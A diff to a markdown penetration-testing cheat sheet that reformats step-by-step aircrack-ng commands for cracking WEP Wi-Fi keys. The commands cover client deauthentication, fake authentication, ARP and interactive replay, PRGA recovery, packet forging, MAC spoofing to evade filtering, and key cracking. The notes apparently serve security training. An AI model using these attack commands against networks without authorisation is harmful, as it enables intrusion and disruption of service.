@@ -276,43 +276,79 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 ##### Getting IVs PCAP
 
 ###### Workbook Method (With associated victim)
-| Terminal No. | Command | Purpose |
-| ------------ | ------- | ------- |
-| 1 | `airodump-ng [interface]` | Get ESSID, BSSID, Client's MAC, Channel.
-| 2 | `aireplay-ng [interface] --deauth 500 -a [MAC of AP] -c [Client's MAC]` | Deauths client to force the client to reconnect and make an ARP request.
-| 3 | `aireplay-ng [interface] --arpreplay -b [MAC of AP] -h [Client's MAC]` | Captures ARP requests and replays them to generate more ARP traffic. Do with previous.
-| 1 | `airodump-ng [interface] --bssid=[MAC of AP] -c [channel] -w [filename]` | Write out pcap file with captured ARP data packets and IVs. Do with previous. Successful when "Data" column in `airodump-ng` is goes up.
+
+* (Terminal 1) Get ESSID, BSSID, Client's MAC, Channel.  
+`airodump-ng [interface]`
+
+* (Terminal 2) Deauths client to force the client to reconnect and make an ARP request.  
+`aireplay-ng --deauth 500 -a [MAC of AP] -c [Client's MAC] [interface]`
+
+* (Terminal 3) Captures ARP requests and replays them to generate more ARP traffic. Do with previous.  
+`aireplay-ng --arpreplay -b [MAC of AP] -h [Client's MAC] [interface]`
+
+* (Terminal 1) Write out pcap file with captured ARP data packets and IVs. Do with previous. Successful when "Data" column in `airodump-ng` is goes up.  
+`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### No Client Associated Method 1 (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)
-| Terminal No. | Command | Purpose |
-| ------------ | ------- | ------- |
-| 1 | `airodump-ng [interface]` | Get ESSID, BSSID, Client's MAC, Channel.
-| 2 | `aireplay-ng [interface] --fakeauth 0 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP]` | Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.
-| 3 | `aireplay-ng [interface] --arpreplay -b [MAC of AP] -h [Our/Client's MAC]` | Captures ARP requests and replays them to generate more ARP traffic. Do with previous.
-| 1 | `airodump-ng [interface] --bssid=[MAC of AP] -c [channel] -w [filename]` | Write out pcap file with captured ARP data packets and IVs. Do with previous 2. Successful when "Data" column in `airodump-ng` is goes up.
+
+* (Terminal 1 ) Get ESSID, BSSID, Client's MAC, Channel.  
+`airodump-ng [interface]`
+
+* (Terminal 2) Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.  
+`aireplay-ng --fakeauth 0 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
+
+* (Terminal 3) Captures ARP requests and replays them to generate more ARP traffic. Do with previous.  
+`aireplay-ng --arpreplay -b [MAC of AP] -h [Our/Client's MAC] [interface]`
+
+* (Terminal 1) Write out pcap file with captured ARP data packets and IVs. Do with previous 2. Successful when "Data" column in `airodump-ng` is goes up.  
+`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### No Client Associated Method 2 - Interactive Replay Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)
-| Terminal No. | Command | Purpose |
-| ------------ | ------- | ------- |
-| 1 | `airodump-ng [interface]` | Get ESSID, BSSID, Client's MAC, Channel.
-| 2 | `aireplay-ng [interface] --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP]` or `--fakeauth 5000 -o 1 -q 15` or `--fakeauth 20 -o 1 -q 15` | Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.
-| 3 | `aireplay-ng [interface] --interactive -b [MAC of AP] -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -p 0841 -h [Our/Client's MAC]` | Captures data frames and reinjects them to generate more traffic. Reply 'y' when prompted to reinject. Do with previous.
-| 1 | `airodump-ng [interface] --bssid=[MAC of AP] -c [channel] -w [filename]` | Write out pcap file with captured data packets and IVs. Do with previous 2. Successful when "Data" column in `airodump-ng` is goes up.
+
+* (Terminal 1) Get ESSID, BSSID, Client's MAC, Channel.  
+`airodump-ng [interface]`
+
+* (Terminal 2) Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.  
+`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
+`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
+`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
+
+* (Terminal 3) Captures data frames and reinjects them to generate more traffic. Reply 'y' when prompted to reinject. Do with previous.  
+`aireplay-ng --interactive -b [MAC of AP] -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -p 0841 -h [Our/Client's MAC] [interface]`
+
+* (Terminal 1) Write out pcap file with captured data packets and IVs. Do with previous 2. Successful when "Data" column in `airodump-ng` is goes up.  
+`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### No Client Associated Method 3 - PRGA Packetforge Interactive Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)
-| Terminal No. | Command | Purpose |
-| ------------ | ------- | ------- |
-| 1 | `airodump-ng [interface]` | Get ESSID, BSSID, Client's MAC, Channel.
-| 2 | `aireplay-ng [interface] --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP]` or `--fakeauth 5000 -o 1 -q 15` or `--fakeauth 20 -o 1 -q 15` | Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.
-| 3 | `aireplay-ng [interface] --fragment -b [MAC of AP] -h [Our/Client's MAC]` or `--chopchop` | Captures data frames and attempts to obtain PRGA from AP by reinjecting and generating more traffic. Stores PRGA in a `.xor` file in current dir. Reply 'y' when prompted to reinject. Do with previous.
-| 3 | `packetforge-ng --arp -a [MAC of AP] -h [Our/Client's MAC] -l 255.255.255.255 -k 255.255.255.255 -y [.xor PRGA File] -w [filename]` | 
-| 3 | `aireplay-ng [interface] --interactive -r [filename from prev step]` | 
-| 1 | `airodump-ng [interface] --bssid=[MAC of AP] -c [channel] -w [filename]` | Write out pcap file with captured data packets and IVs. Do with previous. Successful when "Data" column in `airodump-ng` is goes up.
+
+* (Terminal 1) Get ESSID, BSSID, Client's MAC, Channel.  
+`airodump-ng [interface]`
+
+* (Terminal 2) Attempts to associate with AP. Successful when `Association successful :)` appears and stays, with no deauthentication messages.  
+`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
+`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
+`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
+
+* (Terminal 3) Captures data frames and attempts to obtain PRGA from AP by reinjecting and generating more traffic. Stores PRGA in a `.xor` file in current dir. Reply 'y' when prompted to reinject. May require few attempts with different packets, better with FromDS: 1. Do with previous.  
+`aireplay-ng --fragment -b [MAC of AP] -h [Our/Client's MAC] [interface]`  
+`aireplay-ng --chopchop -b [MAC of AP] -h [Our/Client's MAC] [interface]`
+
+* (Terminal 3) 
+`packetforge-ng --arp -a [MAC of AP] -h [Our/Client's MAC] -l 255.255.255.255 -k 255.255.255.255 -y [.xor PRGA File] -w [filename]`
+
+* (Terminal 3)
+`aireplay-ng --interactive -r [filename from prev step] [interface]`
+
+* (Terminal 1) Write out pcap file with captured data packets and IVs. Do with previous. Successful when "Data" column in `airodump-ng` is goes up.  
+`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`
 
 ###### *Changing MAC Address (Required when AP uses MAC filtering)
-* Backup old MAC address by copying it from `ifconfig [interface]`.
-* Try `ifconfig [interface] hw ether [xx:xx:xx:xx:xx:xx]`, may not work on all Linux distributions, doesn't work on OSWA Assistant.
-* Else, try this other method:
+
+* Backup old MAC address (first 6 bytes of HWaddr)  
+`ifconfig [interface]`
+
+* Change MAC with one of the following  
+  `ifconfig [interface] hw ether [xx:xx:xx:xx:xx:xx]` (may not work on all Linux distributions, doesn't work on OSWA Assistant.)
   * For Non-Atheros Chipsets:
     1. `ifconfig [interface] down`
     2. `ip link set [interface] address [xx:xx:xx:xx:xx:xx]`
@@ -325,7 +361,9 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
     4. `wlanconfig [interface] destroy`
     5. `wlanconfig [interface] create wlandev wifi0 wlanmode monitor`
     6. `ifconfig [interface] up`
-* Verify that MAC address has been changed with `ifconfig [interface]`.
+
+* Verify that MAC address has been changed  
+`ifconfig [interface]`
 
 ##### Crack Password With IV Data
-`aircrack-ng -a 1 -b [MAC of AP] [filename of PCAP file being captured]`, will require 40k+ data frames with IVs for 104-bit WEP keys.
+`aircrack-ng -a 1 -b [MAC of AP] [filename of PCAP file being captured]` (Will require 40k+ data frames with IVs for 104-bit WEP keys)
